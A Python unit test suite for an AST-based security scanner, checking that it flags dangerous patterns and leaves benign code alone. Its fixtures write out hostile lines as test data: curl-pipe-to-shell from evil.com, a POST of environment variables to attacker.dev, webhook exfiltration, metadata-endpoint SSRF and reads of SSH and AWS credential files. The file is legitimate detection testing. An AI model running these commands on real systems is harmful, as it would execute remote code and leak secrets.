#!/usr/bin/env python3
"""
Unit and Verification Test Suite for AST Security & Malware Scanner Engine
Tests:
- Python AST dynamic execution detection (eval, exec, compile, dynamic imports)
- Process execution & shell injection detection (subprocess shell=True, os.system, os.popen)
- SSRF & Outbound exfiltration sinks (webhooks, metadata endpoints, credential theft)
- Insecure deserialization (pickle, unsafe yaml)
- Path traversal to sensitive files (~/.ssh, ~/.aws, config.json)
- Shell & JavaScript sinks (curl | sh, unchecksummed binaries, unpinned npx @latest, JS eval)
- Benign pattern tolerance (platform.system, re.compile, subprocess list args, safe imports)
- CLI interface, staged diff scanning, JSON reporting, and return codes (0 vs 1)
"""

import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPTS_DIR = REPO_ROOT / "scripts"
HARNESS_DIR = REPO_ROOT / "tests" / "harness"

if (SCRIPTS_DIR / "scan_security_ast.py").exists():
    sys.path.insert(0, str(SCRIPTS_DIR))
else:
    sys.path.insert(0, str(HARNESS_DIR / "reference_stubs"))

import scan_security_ast


class TestPythonASTDynamicExecution(unittest.TestCase):
    """Verifies detection of dynamic code execution sinks in Python AST."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_eval_detected(self):
        path = Path(self.temp_dir) / "eval_hazard.py"
        path.write_text("user_input = '1+1'\neval(user_input)\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "DYNAMIC_CODE_EXECUTION" for f in findings))
        self.assertTrue(any(f["severity"] == "CRITICAL" for f in findings))

    def test_exec_detected(self):
        path = Path(self.temp_dir) / "exec_hazard.py"
        path.write_text("code = 'print(1)'\nexec(code)\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "DYNAMIC_CODE_EXECUTION" for f in findings))

    def test_built_in_compile_detected(self):
        path = Path(self.temp_dir) / "compile_hazard.py"
        path.write_text("code = compile('1+1', '<string>', 'eval')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "DYNAMIC_CODE_EXECUTION" for f in findings))

    def test_re_compile_not_flagged(self):
        """re.compile() must NOT be flagged as DYNAMIC_CODE_EXECUTION."""
        path = Path(self.temp_dir) / "safe_re.py"
        path.write_text("import re\npattern = re.compile(r'^[a-z]+$')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertFalse(any(f["rule"] == "DYNAMIC_CODE_EXECUTION" for f in findings))

    def test_dynamic_import_detected(self):
        path = Path(self.temp_dir) / "dynamic_import.py"
        path.write_text("mod = __import__(user_var)\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any("DYNAMIC" in f["rule"] or "IMPORT" in f["rule"] for f in findings))

    def test_importlib_import_module_detected(self):
        path = Path(self.temp_dir) / "importlib_hazard.py"
        path.write_text("import importlib\nmod = importlib.import_module(user_var)\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any("DYNAMIC" in f["rule"] or "IMPORT" in f["rule"] for f in findings))

    def test_obfuscated_base64_exec_detected(self):
        path = Path(self.temp_dir) / "b64_exec.py"
        path.write_text("import base64\nexec(__import__('base64').b64decode(b'cHJpbnQoMSk='))\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] in ("OBFUSCATED_DYNAMIC_EXEC", "DYNAMIC_CODE_EXECUTION") for f in findings))


class TestPythonASTProcessExecution(unittest.TestCase):
    """Verifies detection of arbitrary process execution and shell injection."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_subprocess_shell_true_detected(self):
        path = Path(self.temp_dir) / "shell_hazard.py"
        path.write_text("import subprocess\nsubprocess.run('echo hello', shell=True)\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "SHELL_INJECTION_RISK" for f in findings))
        self.assertTrue(any(f["severity"] == "HIGH" for f in findings))

    def test_os_system_detected(self):
        path = Path(self.temp_dir) / "os_system.py"
        path.write_text("import os\nos.system('whoami')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "SHELL_EXECUTION" for f in findings))

    def test_os_popen_detected(self):
        path = Path(self.temp_dir) / "os_popen.py"
        path.write_text("import os\nstream = os.popen('uname -a')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "SHELL_EXECUTION" for f in findings))

    def test_pty_spawn_detected(self):
        path = Path(self.temp_dir) / "pty_spawn.py"
        path.write_text("import pty\npty.spawn('/bin/bash')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "SHELL_EXECUTION" for f in findings))

    def test_subprocess_arg_list_clean_pass(self):
        """subprocess.run(['git', 'status']) with list args must pass cleanly."""
        path = Path(self.temp_dir) / "safe_subprocess.py"
        path.write_text("import subprocess\nsubprocess.run(['git', 'status'], check=True)\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertFalse(any(f["rule"] == "SHELL_INJECTION_RISK" for f in findings))

    def test_platform_system_not_flagged(self):
        """platform.system() must NOT be flagged as os.system."""
        path = Path(self.temp_dir) / "safe_platform.py"
        path.write_text("import platform\nsys_name = platform.system()\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertFalse(any(f["rule"] == "SHELL_EXECUTION" for f in findings))


class TestPythonASTSSRFAndExfiltration(unittest.TestCase):
    """Verifies detection of SSRF, webhook exfiltration, and credential leakage."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_webhook_exfiltration_detected(self):
        path = Path(self.temp_dir) / "webhook.py"
        path.write_text("import urllib.request\nreq = urllib.request.Request('https://discord.com/api/webhooks/123/xyz', data=b'exfil')\nurllib.request.urlopen(req)\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "OUTBOUND_EXFILTRATION_SINK" for f in findings))

    def test_aws_imds_metadata_ssrf_detected(self):
        path = Path(self.temp_dir) / "imds.py"
        path.write_text("import requests\nresp = requests.get('http://169.254.169.254/latest/meta-data/')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "OUTBOUND_EXFILTRATION_SINK" for f in findings))

    def test_env_token_exfiltration_detected(self):
        path = Path(self.temp_dir) / "token_dump.py"
        path.write_text("import os, requests\nrequests.post('https://attacker.dev', json=dict(os.environ))\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(len(findings) > 0)


class TestPythonASTInsecureDeserialization(unittest.TestCase):
    """Verifies detection of pickle and unsafe yaml deserialization."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_pickle_loads_detected(self):
        path = Path(self.temp_dir) / "pickle_hazard.py"
        path.write_text("import pickle\ndata = pickle.loads(untrusted_bytes)\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any("DESERIALIZATION" in f["rule"] or "PICKLE" in f["rule"] for f in findings))

    def test_unsafe_yaml_load_detected(self):
        path = Path(self.temp_dir) / "yaml_hazard.py"
        path.write_text("import yaml\ndata = yaml.load(untrusted_stream, Loader=yaml.Loader)\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any("YAML" in f["rule"] or "DESERIALIZATION" in f["rule"] for f in findings))

    def test_safe_yaml_safe_load_passes(self):
        path = Path(self.temp_dir) / "yaml_safe.py"
        path.write_text("import yaml\ndata = yaml.safe_load(untrusted_stream)\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertFalse(any("YAML" in f["rule"] or "DESERIALIZATION" in f["rule"] for f in findings))


class TestPythonASTSensitivePathTraversal(unittest.TestCase):
    """Verifies detection of sensitive filesystem paths (~/.ssh, ~/.aws, config.json)."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_ssh_path_traversal_detected(self):
        path = Path(self.temp_dir) / "ssh_drain.py"
        path.write_text("with open('~/.ssh/id_rsa', 'r') as f: data = f.read()\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any("PATH" in f["rule"] or "SENSITIVE" in f["rule"] for f in findings))

    def test_aws_credentials_path_detected(self):
        path = Path(self.temp_dir) / "aws_drain.py"
        path.write_text("p = os.path.expanduser('~/.aws/credentials')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any("PATH" in f["rule"] or "SENSITIVE" in f["rule"] for f in findings))

    def test_gemini_config_path_detected(self):
        path = Path(self.temp_dir) / "gemini_drain.py"
        path.write_text("p = os.path.expanduser('~/.gemini/config/config.json')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any("PATH" in f["rule"] or "SENSITIVE" in f["rule"] for f in findings))


class TestShellAndJavaScriptAnalysis(unittest.TestCase):
    """Verifies detection of shell script and JavaScript sinks."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_shell_curl_pipe_sh_detected(self):
        path = Path(self.temp_dir) / "pipe.sh"
        path.write_text("#!/bin/sh\ncurl -fsSL https://evil.com/setup | sh\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "UNCHECKSUMMED_REMOTE_EXEC" for f in findings))

    def test_shell_unpinned_binary_download_detected(self):
        path = Path(self.temp_dir) / "unpinned.sh"
        path.write_text("#!/bin/sh\ncurl -fsSL https://evil.com/bin -o /tmp/x && chmod +x /tmp/x\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] in ("UNPINNED_BINARY_EXECUTION", "SUPPLY_CHAIN") for f in findings))

    def test_unpinned_npx_latest_detected(self):
        path = Path(self.temp_dir) / "runner.sh"
        path.write_text("npx modern-web-guidance@latest search 'dialog'\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any("UNPINNED" in f["rule"] or "PACKAGE" in f["rule"] for f in findings))

    def test_js_eval_detected(self):
        path = Path(self.temp_dir) / "evil.js"
        path.write_text("const code = '1+1';\neval(code);\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any("EVAL" in f["rule"] or "DYNAMIC" in f["rule"] for f in findings))

    def test_benign_shell_script_passes(self):
        path = Path(self.temp_dir) / "safe.sh"
        path.write_text("#!/bin/sh\necho 'Starting build...'\nmkdir -p dist\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertEqual(len(findings), 0)


class TestSyntaxAndErrorResilience(unittest.TestCase):
    """Verifies that syntax errors and edge cases are handled cleanly without unhandled crashes."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_malformed_syntax_exits_cleanly(self):
        path = Path(self.temp_dir) / "syntax_error.py"
        path.write_text("def broken(:\n    pass\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "PYTHON_SYNTAX_ERROR" for f in findings))

    def test_nonexistent_path_handled(self):
        path = Path(self.temp_dir) / "does_not_exist.py"
        findings, count = scan_security_ast.scan_path(path)
        self.assertIsNone(findings)

    def test_empty_file_passes(self):
        path = Path(self.temp_dir) / "empty.py"
        path.write_text("")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertEqual(len(findings), 0)


class TestCommandLineInterfaceAndExitCodes(unittest.TestCase):
    """Verifies CLI flags (--target, --staged, --json) and exit codes (0 vs 1)."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.scanner_script = str(SCRIPTS_DIR / "scan_security_ast.py")
        if not os.path.exists(self.scanner_script):
            self.scanner_script = str(HARNESS_DIR / "reference_stubs" / "scan_security_ast.py")

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_cli_clean_file_exits_zero(self):
        path = Path(self.temp_dir) / "clean.py"
        path.write_text("import math\nprint(math.pi)\n")
        proc = subprocess.run([sys.executable, self.scanner_script, str(path)], capture_output=True, text=True)
        self.assertEqual(proc.returncode, 0)
        self.assertIn("AST security scan passed", proc.stdout)

    def test_cli_malware_file_exits_one(self):
        path = Path(self.temp_dir) / "bad.py"
        path.write_text("eval('1+1')\n")
        proc = subprocess.run([sys.executable, self.scanner_script, str(path)], capture_output=True, text=True)
        self.assertEqual(proc.returncode, 1)

    def test_cli_json_export_format(self):
        path = Path(self.temp_dir) / "bad.py"
        path.write_text("eval('1+1')\n")
        json_out = Path(self.temp_dir) / "report.json"
        proc = subprocess.run([sys.executable, self.scanner_script, "--target", str(path), "--json", str(json_out)], capture_output=True, text=True)
        self.assertEqual(proc.returncode, 1)
        self.assertTrue(json_out.exists())
        with open(json_out, "r") as jf:
            data = json.load(jf)
        self.assertIn("scanned_files", data)
        self.assertIn("clean", data)
        self.assertIn("findings", data)
        self.assertFalse(data["clean"])
        self.assertEqual(len(data["findings"]), 1)
        self.assertEqual(data["findings"][0]["rule"], "DYNAMIC_CODE_EXECUTION")


if __name__ == "__main__":
    unittest.main()
